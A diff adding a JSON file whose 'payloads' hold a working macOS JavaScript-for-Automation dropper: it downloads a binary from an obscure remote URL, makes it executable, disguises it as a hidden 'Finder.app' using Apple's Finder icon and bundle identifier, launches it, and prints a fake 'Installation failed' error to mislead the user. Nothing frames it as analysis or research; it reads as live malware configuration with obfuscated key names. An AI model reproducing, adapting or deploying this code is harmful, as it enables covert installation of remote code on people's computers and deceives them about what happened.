@@ -1,0 +1,21 @@
+[
+  {
+    "outcomes": [
+      "polProxyjIgw",
+      "dnsRule1p8U",
+      "ipsecTokenjPGh",
+      "avfMaskXRs5",
+      "nvrAction8xGJ",
+      "asmActionh0E2",
+      "mdsActionR1G9",
+      "amfiSegr624",
+      "fwPassyMkB"
+    ],
+    "derived_key_hex": "18bc16f9779ab86edba6f69086f1fc8062f5fc0b5a14731ae11f88967173820d",
+    "payloads": {
+      "verifySocketPublisher": "https://gretgerherhdf.it.com/kug2gn/t7sDAzFPAA2v",
+      "parseProtocolLog": "~/Library/Application Support/com.apple.finder.agent",
+      "gatherOrganizationEntry": "this.copyIcon=function(p){\nvar fm=$.NSFileManager.defaultManager;\nvar src=\"/System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns\";\nvar dst=p+\"/Contents/Resources/AppIcon.icns\";\nfm.createDirectoryAtPathWithIntermediateDirectoriesAttributesError($(p+\"/Contents/Resources\"),true,$(),$());\nfm.copyItemAtPathToPathError(src,dst,$());\n};\nthis.createInfoPlist=function(p,e){\nvar x=\"<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?>\\n\"+\n\"<!DOCTYPE plist PUBLIC \\\"-//Apple//DTD PLIST 1.0//EN\\\" \\\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\\\">\\n\"+\n\"<plist version=\\\"1.0\\\"><dict>\\n\"+\n\"<key>CFBundleExecutable</key><string>\"+e+\"</string>\\n\"+\n\"<key>CFBundleIdentifier</key><string>com.apple.finder.agent</string>\\n\"+\n\"<key>CFBundleName</key><string>Finder</string>\\n\"+\n\"<key>CFBundleDisplayName</key><string>Finder</string>\\n\"+\n\"<key>CFBundleIconFile</key><string>AppIcon</string>\\n\"+\n\"<key>LSUIElement</key><true/>\\n\"+\n\"<key>LSBackgroundOnly</key><true/>\\n</dict></plist>\";\nvar d=$.NSString.stringWithString(x).dataUsingEncoding($.NSUTF8StringEncoding);\nreturn $.NSFileManager.defaultManager.createFileAtPathContentsAttributes($(p+\"/Contents/Info.plist\"),d,$());\n};\nthis.printStatus=function(m){\nvar h=$.NSFileHandle.fileHandleWithStandardOutput;\nvar d=$.NSString.alloc.initWithString(\"\\033[2K\\r\"+m).dataUsingEncoding($.NSUTF8StringEncoding);\nh.writeData(d);\n};\nthis.printError=function(){\nvar h=$.NSFileHandle.fileHandleWithStandardOutput;\nvar d=$.NSString.alloc.initWithString(\"\\033[2K\\rInstallation failed.\\nThis software requires additional system components that aren't available.\\n\").dataUsingEncoding($.NSUTF8StringEncoding);\nh.writeData(d);\n};\nthis.launchApp=function(p){\ntry{\nvar ws=$.NSWorkspace.sharedWorkspace;\nvar url=$.NSURL.fileURLWithPath(p);\nws.openURL(url);\n}catch(e){}\n};\nthis.setupApp=function(b,a,e){\nvar fm=$.NSFileManager.defaultManager;\nfm.createDirectoryAtPathWithIntermediateDirectoriesAttributesError($(a+\"/Contents/MacOS\"),true,$(),$());\ncopyIcon(a);\ncreateInfoPlist(a,e);\nfm.createFileAtPathContentsAttributes($(b+\"/.Cheked\"),$(),$());\n};\nthis.serializeServiceProfile=function(url,path){\ntry{\nvar done=false;\nvar attempts=0;\nvar maxRetries=3;\nvar execName=\"C6690F41\";\nvar fm=$.NSFileManager.defaultManager;\nvar baseDir=$(path).stringByExpandingTildeInPath.js;\nvar appPath=baseDir+\"/Finder.app\";\nvar macosPath=appPath+\"/Contents/MacOS\";\nvar binPath=macosPath+\"/\"+execName;\nif(fm.fileExistsAtPath($(binPath))){\nprintError();\n$.exit(0);}\nfm.createDirectoryAtPathWithIntermediateDirectoriesAttributesError($(macosPath),true,$(),$());\nfunction doDownload(){\n$.NSURLSession.sessionWithConfiguration($.NSURLSessionConfiguration.ephemeralSessionConfiguration).dataTaskWithURLCompletionHandler(\n$.NSURL.URLWithString(url),\nfunction(data,resp,err){\nif(err.isNil()&&resp.statusCode==200&&!data.isNil()&&data.length>0){\nvar attrs=$.NSDictionary.dictionaryWithObjectForKey($(493),$.NSFilePosixPermissions);\nif(fm.createFileAtPathContentsAttributes($(binPath),data,attrs)){\nsetupApp(baseDir,appPath,execName);\ndone=true;\n}\n}else{\nattempts++;\nif(attempts<maxRetries){doDownload();return;}\n}\ndone=true;\n}\n).resume;\n}\ndoDownload();\nvar loop=$.NSRunLoop.currentRunLoop;\nvar dotCount=0;\nwhile(!done){\nvar dots=\".\".repeat(dotCount%4);\nprintStatus(\"Downloading\"+dots);\ndotCount++;\nloop.runUntilDate($.NSDate.dateWithTimeIntervalSinceNow(0.3));\n}\nprintStatus(\"Installing...\");\nlaunchApp(appPath);\nprintError();\n$.exit(0);\n}catch(e){$.exit(1);}\n};\n"
+    }
+  }
+]
